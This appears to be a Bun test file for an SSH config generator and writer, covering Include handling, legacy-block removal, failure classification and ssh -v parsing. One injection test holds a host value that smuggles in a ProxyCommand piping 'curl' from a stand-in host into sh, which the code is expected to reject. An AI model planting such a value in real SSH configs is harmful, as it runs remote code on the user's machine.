import { describe, it, expect, beforeEach, afterEach } from "bun:test";
import { existsSync, mkdtempSync, rmSync, writeFileSync, readFileSync, statSync, symlinkSync, lstatSync, chmodSync, mkdirSync } from "fs";
import { tmpdir } from "os";
import { join } from "path";
import {
  generateHostConfig,
  writeHostConfig,
  removeHostBlock,
  isAuthFailure,
  isHostKeyFailure,
  dumpValue,
  type HostBlock,
} from "../../src/ssh/config";

const block: HostBlock = {
  alias: "haven-0123456789abcdef",
  host: "myhost.com",
  port: 2222,
  user: "abc",
  identityFiles: ["/home/u/.ssh/id_ed25519"],
  identitiesOnly: true,
};

describe("generateHostConfig", () => {
  it("generates valid SSH config", () => {
    const config = generateHostConfig(block);
    
    expect(config).toContain("Host haven-0123456789abcdef");
    expect(config).toContain("HostName myhost.com");
    expect(config).toContain("Port 2222");
    expect(config).toContain("User abc");
    expect(config).toContain("ServerAliveInterval 5");
  });

  it("includes security settings", () => {
    const config = generateHostConfig(block);
    
    expect(config).toContain("ForwardAgent no");
    expect(config).toContain("ForwardX11 no");
    expect(config).toContain("StrictHostKeyChecking yes");
    expect(config).not.toContain("accept-new");
  });

  it("turns CheckHostIP off, whose stale address lines failed every connect after a key change", () => {
    expect(generateHostConfig(block)).toContain("CheckHostIP no");
  });

  it("offers exactly one key (M-7)", () => {
    const config = generateHostConfig(block);
    expect(config).toContain("IdentitiesOnly yes");
    expect(config.match(/IdentityFile/g)).toHaveLength(1);
    expect(config).toContain('IdentityFile "/home/u/.ssh/id_ed25519"');
  });

  it("quotes identity paths and escapes ssh %-tokens", () => {
    const config = generateHostConfig({ ...block, identityFiles: ["/Users/Jo Doe/.ssh/key%d"] });
    expect(config).toContain('IdentityFile "/Users/Jo Doe/.ssh/key%%d"');
  });

  it("writes the fallback block with every key and ssh's own selection on", () => {
    const config = generateHostConfig({
      ...block,
      identityFiles: ["/home/u/.ssh/id_ed25519", "/home/u/.ssh/id_rsa"],
      identitiesOnly: false,
    });
    expect(config.match(/IdentityFile/g)).toHaveLength(2);
    expect(config).not.toContain("IdentitiesOnly");
    expect(config).toContain("StrictHostKeyChecking yes");
  });

  it("refuses IdentitiesOnly without a key, which would mean ssh's default files", () => {
    expect(() => generateHostConfig({ ...block, identityFiles: [], identitiesOnly: true })).toThrow();
    expect(generateHostConfig({ ...block, identityFiles: [], identitiesOnly: false })).not.toContain("IdentityFile");
  });

  it("refuses values that could inject ssh directives (H-2)", () => {
    const payload = "workspace.example.com\n  Host *\n  ProxyCommand curl -s evilsh.invalid/pwn|sh";
    expect(() => generateHostConfig({ ...block, host: payload })).toThrow();
    expect(() => generateHostConfig({ ...block, user: "abc\n  ProxyCommand x" })).toThrow();
    expect(() => generateHostConfig({ ...block, alias: "haven-x\nHost *" })).toThrow();
    expect(() => generateHostConfig({ ...block, port: 0 })).toThrow();
    expect(() => generateHostConfig({ ...block, identityFiles: ['/k"\n  ProxyCommand x'] })).toThrow();
    expect(() => generateHostConfig({ ...block, identityFiles: ["relative/key"] })).toThrow();
  });
});

describe("writeHostConfig", () => {
  let sshDir: string;

  beforeEach(() => {
    sshDir = mkdtempSync(`${tmpdir()}/haven-ssh-`);
  });

  afterEach(() => {
    rmSync(sshDir, { recursive: true, force: true });
  });

  const userConfig = () => readFileSync(`${sshDir}/config`, "utf-8");
  const havenConfig = () => readFileSync(`${sshDir}/haven/config`, "utf-8");

  it("writes the block to haven's own file and includes it first in ~/.ssh/config", () => {
    writeFileSync(`${sshDir}/config`, "Host *\n  ForwardAgent yes\n", { mode: 0o600 });

    writeHostConfig(block, [], sshDir);

    expect(userConfig().split("\n").filter((l) => !l.startsWith("#"))[0]).toBe("Include ~/.ssh/haven/config");
    expect(userConfig()).toContain("Host *\n  ForwardAgent yes\n");
    expect(havenConfig()).toContain(generateHostConfig(block));
    expect(statSync(`${sshDir}/haven/config`).mode & 0o777).toBe(0o600);
    expect(statSync(`${sshDir}/haven`).mode & 0o777).toBe(0o700);
  });

  it("creates ~/.ssh/config privately when there is none", () => {
    writeHostConfig(block, [], sshDir);
    expect(userConfig()).toContain("Include ~/.ssh/haven/config");
    expect(statSync(`${sshDir}/config`).mode & 0o777).toBe(0o600);
  });

  it("adds the include once and replaces the block on reconnect", () => {
    writeHostConfig(block, [], sshDir);
    writeHostConfig({ ...block, identityFiles: ["/home/u/.ssh/haven_ed25519"] }, [], sshDir);

    expect(userConfig().match(/Include ~\/\.ssh\/haven\/config/g)).toHaveLength(1);
    expect(havenConfig().match(/^Host haven-0123456789abcdef$/gm)).toHaveLength(1);
    expect(havenConfig()).toContain('IdentityFile "/home/u/.ssh/haven_ed25519"');
    expect(havenConfig()).not.toContain("id_ed25519\"");
  });

  it("keeps other workspaces' blocks", () => {
    writeHostConfig(block, [], sshDir);
    writeHostConfig({ ...block, alias: "haven-fedcba9876543210", host: "other.example.com" }, [], sshDir);

    expect(havenConfig()).toContain("Host haven-0123456789abcdef");
    expect(havenConfig()).toContain("Host haven-fedcba9876543210");
  });

  // A block as the committed version before the include wrote it into ~/.ssh/config.
  const legacyBlock = (alias: string, identityFiles: string[]) => [
    `Host ${alias}`,
    "  HostName old.example.com",
    "  Port 22",
    "  User abc",
    ...identityFiles.map((file) => `  IdentityFile ${file}`),
    "  ForwardAgent no",
    "  ForwardX11 no",
    "  StrictHostKeyChecking accept-new",
    "  ServerAliveInterval 5",
    "  ServerAliveCountMax 3",
  ].join("\n");

  it("removes an older version's block without swallowing a following Match block (L-11)", () => {
    const legacy = [
      "Host github.com",
      "  User git",
      "",
      legacyBlock("haven-abc123", ["/home/u/.ssh/id_rsa", "/home/u/.ssh/work key"]),
      "",
      "Match host *.corp.example",
      "  ProxyJump bastion",
      "",
    ].join("\n");
    writeFileSync(`${sshDir}/config`, legacy, { mode: 0o644 });
    chmodSync(`${sshDir}/config`, 0o644);

    writeHostConfig(block, ["haven-abc123"], sshDir);

    const content = userConfig();
    expect(content).not.toContain("haven-abc123");
    expect(content).not.toContain("old.example.com");
    expect(content).toContain("Host github.com\n  User git\n");
    expect(content).toContain("Match host *.corp.example\n  ProxyJump bastion\n");
    // The user's own mode is kept.
    expect(statSync(`${sshDir}/config`).mode & 0o777).toBe(0o644);
  });

  it("removes an older version's block with no IdentityFile line, at the end of the file", () => {
    writeFileSync(`${sshDir}/config`, `Host github.com\n  User git\n\n${legacyBlock("haven-abc123", [])}\n`, { mode: 0o600 });
    writeHostConfig(block, ["haven-abc123"], sshDir);
    expect(userConfig()).not.toContain("haven-abc123");
    expect(userConfig()).toContain("Host github.com\n  User git\n");
  });

  it("removes an older version's block followed by a comment, and keeps the comment", () => {
    writeFileSync(`${sshDir}/config`, `${legacyBlock("haven-abc123", [])}\n\n# work\nHost github.com\n  User git\n`, { mode: 0o600 });
    writeHostConfig(block, ["haven-abc123"], sshDir);
    expect(userConfig()).not.toContain("haven-abc123");
    expect(userConfig()).toContain("# work\nHost github.com\n  User git\n");
  });

  it("keeps an older version's block when a line of the user's follows it, indented or not", () => {
    // ssh reads every line up to the next Host or Match as part of the block above it.
    for (const tail of ["  LocalForward 9000 localhost:9000\n", "\nLocalForward 9000 localhost:9000\n"]) {
      const edited = `${legacyBlock("haven-abc123", ["/home/u/.ssh/id_rsa"])}\n${tail}`;
      writeFileSync(`${sshDir}/config`, edited, { mode: 0o600 });
      writeHostConfig(block, ["haven-abc123"], sshDir);
      expect(userConfig()).toContain(edited);
    }
  });

  it("keeps the user's own block for the workspace's alias, and an older version's block they edited", () => {
    const own = "# Port forward for the dev server\nHost haven-0123456789abcdef\n  LocalForward 8080 localhost:8080\n";
    const edited = `${legacyBlock("haven-abc123", ["/home/u/.ssh/id_rsa"])}\n  LocalForward 9000 localhost:9000\n`;
    writeFileSync(`${sshDir}/config`, `${own}\n${edited}`, { mode: 0o600 });

    // A connect writes the probe block, then the workspace's own block, dropping the probe and
    // the alias the directory used before.
    writeHostConfig({ ...block, alias: "haven-probe0123456789abcdef" }, [], sshDir);
    writeHostConfig(block, ["haven-probe0123456789abcdef", "haven-abc123"], sshDir);

    expect(userConfig()).toContain(own);
    expect(userConfig()).toContain(edited);
    expect(havenConfig()).toContain(generateHostConfig(block));
  });

  it("drops a superseded alias from haven's own file", () => {
    writeHostConfig({ ...block, alias: "haven-abc123" }, [], sshDir);
    writeHostConfig(block, ["haven-abc123"], sshDir);
    expect(havenConfig()).not.toContain("haven-abc123");
    expect(havenConfig()).toContain("Host haven-0123456789abcdef");
  });

  it("writes through a symlinked ~/.ssh/config and keeps the link", () => {
    const dotfile = `${sshDir}/dotfiles-config`;
    writeFileSync(dotfile, "Host github.com\n  User git\n", { mode: 0o600 });
    symlinkSync(dotfile, `${sshDir}/config`);

    writeHostConfig(block, [], sshDir);

    expect(lstatSync(`${sshDir}/config`).isSymbolicLink()).toBe(true);
    expect(readFileSync(dotfile, "utf-8")).toContain("Include ~/.ssh/haven/config");
  });

  it("leaves ~/.ssh/config untouched when the include is already there", () => {
    const content = "Include ~/.ssh/haven/config\n\nHost github.com\n  User git\n";
    writeFileSync(`${sshDir}/config`, content, { mode: 0o600 });
    const before = statSync(`${sshDir}/config`).mtimeMs;

    writeHostConfig(block, [], sshDir);

    expect(userConfig()).toBe(content);
    expect(statSync(`${sshDir}/config`).mtimeMs).toBe(before);
  });

  it("refuses to drop an alias that is not haven's", () => {
    expect(() => writeHostConfig(block, ["github.com"], sshDir)).toThrow();
  });

  it("removes one alias's block and keeps the others", () => {
    const probe = { ...block, alias: "haven-probe0123456789abcdef", identityFiles: ["/home/u/.ssh/other"] };
    writeHostConfig(block, [], sshDir);
    writeHostConfig(probe, [], sshDir);
    expect(havenConfig()).toContain(`Host ${probe.alias}\n`);

    removeHostBlock(probe.alias, sshDir);
    expect(havenConfig()).not.toContain(probe.alias);
    expect(havenConfig()).toContain(generateHostConfig(block));

    const before = havenConfig();
    removeHostBlock(probe.alias, sshDir);
    expect(havenConfig()).toBe(before);
    expect(() => removeHostBlock("github.com", sshDir)).toThrow();
  });

  it("removes nothing, and creates nothing, when haven's file does not exist", () => {
    removeHostBlock(block.alias, sshDir);
    expect(existsSync(`${sshDir}/haven/config`)).toBe(false);
  });
});

describe("failure classification", () => {
  it("tells a refused key from other failures", () => {
    expect(isAuthFailure("abc@host: Permission denied (publickey).")).toBe(true);
    expect(isAuthFailure("Received disconnect from 1.2.3.4 port 22:2: Too many authentication failures")).toBe(true);
    // A server's text quoted inside another ssh message is not ssh's own refusal line.
    expect(isAuthFailure("Bad remote protocol version identification: 'SSH-x: Permission denied (publickey)'")).toBe(false);
    expect(isAuthFailure("ssh: connect to host h port 22: Connection refused")).toBe(false);
    expect(isHostKeyFailure("Host key verification failed.")).toBe(true);
    // A server that presents the trusted public key but cannot sign with it.
    expect(isHostKeyFailure("ssh_dispatch_run_fatal: Connection to 1.2.3.4 port 22: incorrect signature")).toBe(true);
    expect(isHostKeyFailure(undefined)).toBe(false);
  });
});

describe("dumpValue", () => {
  it("reads one keyword of ssh -G output", () => {
    const dump = "user abc\nhostname ws.example.com\nport 2222\nproxyjump bastion,inner\nidentityfile ~/.ssh/a\nidentityfile ~/.ssh/b\n";
    expect(dumpValue(dump, "hostname")).toBe("ws.example.com");
    expect(dumpValue(dump, "port")).toBe("2222");
    expect(dumpValue(dump, "proxyjump")).toBe("bastion,inner");
    expect(dumpValue(dump, "identityfile")).toBe("~/.ssh/a");
    // A keyword that is the start of another is not mistaken for it.
    expect(dumpValue("hostkeyalias ws\n", "host")).toBeUndefined();
    expect(dumpValue(dump, "hostkeyalias")).toBeUndefined();
  });
});

// testConnection drives the real ssh; a stand-in on PATH prints what ssh -v prints, in a
// subprocess because Bun resolves PATH at startup.
describe("testConnection names the accepted key (M-7)", () => {
  let dir: string;

  beforeEach(() => {
    dir = mkdtempSync(`${tmpdir()}/haven-testconn-`);
  });

  afterEach(() => {
    rmSync(dir, { recursive: true, force: true });
  });

  async function run(script: string, identityFiles: string[]): Promise<{ success: boolean; error?: string; acceptedIdentity?: string }> {
    mkdirSync(join(dir, "bin"));
    writeFileSync(join(dir, "bin", "ssh"), script);
    chmodSync(join(dir, "bin", "ssh"), 0o755);
    const code = `
      import { testConnection } from ${JSON.stringify(join(import.meta.dir, "../../src/ssh/config"))};
      console.log(JSON.stringify(await testConnection("haven-0123456789abcdef", ${JSON.stringify(identityFiles)})));
    `;
    const proc = Bun.spawn([process.execPath, "-e", code], {
      env: { ...process.env, PATH: `${join(dir, "bin")}:${process.env["PATH"]}` },
      stdout: "pipe",
      stderr: "pipe",
    });
    const [stdout, stderr, exitCode] = await Promise.all([
      new Response(proc.stdout).text(),
      new Response(proc.stderr).text(),
      proc.exited,
    ]);
    if (exitCode !== 0) throw new Error(stderr);
    return JSON.parse(stdout);
  }

  it("reads the last accepted key from ssh -v, paths with spaces included", async () => {
    const result = await run(`#!/bin/sh
cat >&2 <<'LOG'
OpenSSH_10.0p2, OpenSSL 3.5.4 30 Sep 2025
debug1: Offering public key: /k/haven ED25519 SHA256:aaa explicit
debug1: Server accepts key: /k/locked key ED25519 SHA256:bbb explicit
debug1: Server accepts key: /k/id ed25519 ED25519 SHA256:ccc explicit agent
Authenticated to h ([1.2.3.4]:22) using "publickey".
LOG
echo ok
`, ["/k/haven", "/k/locked key", "/k/id ed25519"]);
    expect(result).toEqual({ success: true, acceptedIdentity: "/k/id ed25519" });
  });

  it("succeeds without naming a key it did not offer", async () => {
    const result = await run(`#!/bin/sh
echo "debug1: Server accepts key: /home/u/.ssh/from_host_star ED25519 SHA256:x explicit" >&2
echo ok
`, ["/k/haven"]);
    expect(result).toEqual({ success: true });
  });

  it("logs in on a connection of its own and shows ssh's lines, whatever the user's config sets", async () => {
    const script = `#!/bin/sh
echo "args: $*" >&2
exit 255
`;
    const plain = await run(script, []);
    expect(plain.error).toContain("LogLevel=ERROR");
    expect(plain.error).not.toContain("-v");
    // A master connection shared through the user's ControlMaster would log in with no key.
    expect(plain.error).toContain("ControlPath=none");
    rmSync(join(dir, "bin"), { recursive: true, force: true });
    const verbose = await run(script, ["/k/haven"]);
    expect(verbose.error).toContain("-v");
    expect(verbose.error).toContain("ControlPath=none");
  });

  it("returns ssh's error without the -v noise", async () => {
    const result = await run(`#!/bin/sh
echo "OpenSSH_10.0p2, OpenSSL 3.5.4 30 Sep 2025" >&2
echo "debug1: Offering public key: /k/haven ED25519 SHA256:aaa explicit" >&2
echo "abc@h: Permission denied (publickey)." >&2
exit 255
`, ["/k/haven"]);
    expect(result).toEqual({ success: false, error: "abc@h: Permission denied (publickey)." });
  });
});
